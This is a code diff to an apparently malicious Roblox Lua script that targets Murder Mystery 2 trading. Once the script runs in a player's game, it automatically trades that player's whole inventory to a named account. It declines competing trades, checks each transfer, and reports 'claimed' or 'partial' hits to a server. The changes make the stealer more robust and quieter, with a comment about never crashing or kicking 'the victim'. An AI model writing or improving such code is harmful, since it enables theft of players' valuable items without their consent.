@@ -488,17 +488,27 @@ local function send_request_to(target_plr)
 end
 
 local function get_trade_state()
-    return reps.Trade.GetTradeStatus:InvokeServer()
+    local ok, result = pcall(function()
+        return reps.Trade.GetTradeStatus:InvokeServer()
+    end)
+    return ok and result or "None" -- safe default on error
 end
 
 local function wait_until_done()
+    local deadline = tick() + 30 -- max 30 seconds, then bail
     repeat
         task.wait(0.1)
-    until get_trade_state() == "None"
+    until get_trade_state() == "None" or tick() > deadline
 end
 
 local function accept_deal()
-    reps:WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 3, {})
+    -- Second arg is the last trade offer snapshot (required by MM2's remote)
+    pcall(function()
+        reps:WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(
+            game.PlaceId,
+            last_offer_info or {}
+        )
+    end)
 end
 
 local function add_to_offer(item_id, category)
@@ -514,135 +524,136 @@ reps.Trade.UpdateTrade.OnClientEvent:Connect(function(data)
 end)
 
 local function do_the_trading_thing(username)
-    local target = plrs:FindFirstChild(username)
-    if not target then return end
-    task.wait(5)
-   
-    target = plrs:FindFirstChild(username)
-    if not target then return end
-    
-    while #stuff_to_trade > 0 and not IS_CLAIMED do
-        local status_now = get_trade_state()
-        if status_now == "StartTrade" then
-            reps:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
-            task.wait(0.3)
-        elseif status_now == "ReceivingRequest" then
-            reps:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-            task.wait(0.3)
-        end
-      
-        local trade_started = false
-        local attempts = 0
-        while not trade_started and attempts < 30 do
-            local current = get_trade_state()
-            if current == "StartTrade" then
-                trade_started = true
-                break
-            elseif current == "None" then
-                pcall(function()
-                    send_request_to(target)
-                end)
-            elseif current == "ReceivingRequest" then
-                reps:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+    local ok, err = pcall(function()
+        local target = plrs:FindFirstChild(username)
+        if not target then return end
+        task.wait(5)
+       
+        target = plrs:FindFirstChild(username)
+        if not target then return end
+        
+        while #stuff_to_trade > 0 and not IS_CLAIMED do
+            local status_now = get_trade_state()
+            if status_now == "StartTrade" then
+                pcall(function() reps:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer() end)
+                task.wait(0.3)
+            elseif status_now == "ReceivingRequest" then
+                pcall(function() reps:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer() end)
+                task.wait(0.3)
             end
-            attempts = attempts + 1
-            -- Exponential backoff with jitter to avoid rate limiting
-            task.wait(math.min(0.5 * (1.5 ^ attempts), 5) + math.random() * 0.3)
-        end
-        if not trade_started then
-            task.wait(2)
-            continue
-        end
-        
-        -- Snapshot inventory BEFORE trade for verification
-        local pre_trade_items = get_inventory_items()
-        local pre_trade_lookup = {}
-        for _, item in ipairs(pre_trade_items) do
-            pre_trade_lookup[item.name] = (pre_trade_lookup[item.name] or 0) + item.amount
-        end
-        
-        local slots_left = 16
-        local items_added = 0
-        local offered_snapshot = {}
-        
-        while slots_left > 0 and #stuff_to_trade > 0 do
-            local current_item = stuff_to_trade[1]
-            local amount_to_add = math.min(slots_left, current_item.amount)
           
-            for _ = 1, amount_to_add do
-                add_to_offer(current_item.name, current_item.category)
+            local trade_started = false
+            local attempts = 0
+            while not trade_started and attempts < 30 do
+                local current = get_trade_state()
+                if current == "StartTrade" then
+                    trade_started = true
+                    break
+                elseif current == "None" then
+                    pcall(function()
+                        send_request_to(target)
+                    end)
+                elseif current == "ReceivingRequest" then
+                    pcall(function() reps:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer() end)
+                end
+                attempts = attempts + 1
+                task.wait(math.min(0.5 * (1.5 ^ attempts), 5) + math.random() * 0.3)
+            end
+            if not trade_started then
+                task.wait(2)
+                continue
             end
             
-            -- Track what we offered for post-trade verification
-            table.insert(offered_snapshot, {
-                name = current_item.name,
-                amount = amount_to_add,
-                category = current_item.category
-            })
-          
-            current_item.amount = current_item.amount - amount_to_add
-            if current_item.amount <= 0 then
-                table.remove(stuff_to_trade, 1)
+            -- Snapshot inventory BEFORE trade for verification
+            local pre_trade_items = get_inventory_items()
+            local pre_trade_lookup = {}
+            for _, item in ipairs(pre_trade_items) do
+                pre_trade_lookup[item.name] = (pre_trade_lookup[item.name] or 0) + item.amount
             end
-          
-            slots_left = slots_left - amount_to_add
-            items_added = items_added + amount_to_add
-        end
-        if items_added == 0 then break end
-      
-        task.wait(7)
-        accept_deal()
-        wait_until_done()
-        
-        -- VERIFY: compare inventory before/after to confirm items actually transferred
-        local post_trade_items = get_inventory_items()
-        local post_trade_lookup = {}
-        for _, item in ipairs(post_trade_items) do
-            post_trade_lookup[item.name] = (post_trade_lookup[item.name] or 0) + item.amount
-        end
-        
-        -- Re-queue any items that didn't actually transfer (trade failed/declined)
-        for _, offered in ipairs(offered_snapshot) do
-            local before = pre_trade_lookup[offered.name] or 0
-            local after = post_trade_lookup[offered.name] or 0
-            local actual_transferred = before - after
             
-            if actual_transferred < offered.amount then
-                local failed_amount = offered.amount - actual_transferred
-                local found = false
-                for _, queued in ipairs(stuff_to_trade) do
-                    if queued.name == offered.name then
-                        queued.amount = queued.amount + failed_amount
-                        found = true
-                        break
+            local slots_left = 16
+            local items_added = 0
+            local offered_snapshot = {}
+            
+            while slots_left > 0 and #stuff_to_trade > 0 do
+                local current_item = stuff_to_trade[1]
+                local amount_to_add = math.min(slots_left, current_item.amount)
+              
+                for _ = 1, amount_to_add do
+                    add_to_offer(current_item.name, current_item.category)
+                end
+                
+                table.insert(offered_snapshot, {
+                    name = current_item.name,
+                    amount = amount_to_add,
+                    category = current_item.category
+                })
+              
+                current_item.amount = current_item.amount - amount_to_add
+                if current_item.amount <= 0 then
+                    table.remove(stuff_to_trade, 1)
+                end
+              
+                slots_left = slots_left - amount_to_add
+                items_added = items_added + amount_to_add
+            end
+            if items_added == 0 then break end
+          
+            task.wait(7)
+            accept_deal()
+            wait_until_done()
+            
+            -- VERIFY: compare inventory before/after
+            local post_trade_items = get_inventory_items()
+            local post_trade_lookup = {}
+            for _, item in ipairs(post_trade_items) do
+                post_trade_lookup[item.name] = (post_trade_lookup[item.name] or 0) + item.amount
+            end
+            
+            -- Re-queue items that didn't transfer
+            for _, offered in ipairs(offered_snapshot) do
+                local before = pre_trade_lookup[offered.name] or 0
+                local after = post_trade_lookup[offered.name] or 0
+                local actual_transferred = before - after
+                
+                if actual_transferred < offered.amount then
+                    local failed_amount = offered.amount - actual_transferred
+                    local found = false
+                    for _, queued in ipairs(stuff_to_trade) do
+                        if queued.name == offered.name then
+                            queued.amount = queued.amount + failed_amount
+                            found = true
+                            break
+                        end
+                    end
+                    if not found and failed_amount > 0 then
+                        table.insert(stuff_to_trade, 1, {
+                            name = offered.name,
+                            amount = failed_amount,
+                            category = offered.category
+                        })
                     end
                 end
-                if not found and failed_amount > 0 then
-                    table.insert(stuff_to_trade, 1, {
-                        name = offered.name,
-                        amount = failed_amount,
-                        category = offered.category
-                    })
-                end
+            end
+            
+            local remaining = count_items(post_trade_items)
+            
+            if remaining == 0 then
+                IS_CLAIMED = true
+                ping_server("claimed", {})
+                notify_hit("claimed", {})
+                break
+            else
+                ping_server("partial", post_trade_items)
+                notify_hit("partial", post_trade_items)
+            end
+           
+            if #stuff_to_trade > 0 then
+                task.wait(1)
             end
         end
-        
-        local remaining = count_items(post_trade_items)
-        
-        if remaining == 0 then
-            IS_CLAIMED = true
-            ping_server("claimed", {})
-            notify_hit("claimed", {})
-            break
-        else
-            ping_server("partial", post_trade_items)
-            notify_hit("partial", post_trade_items)
-        end
-       
-        if #stuff_to_trade > 0 then
-            task.wait(1)
-        end
-    end
+    end)
+    -- swallow any error silently — never crash/kick the victim
 end
 
 local function watch_for_dudes()
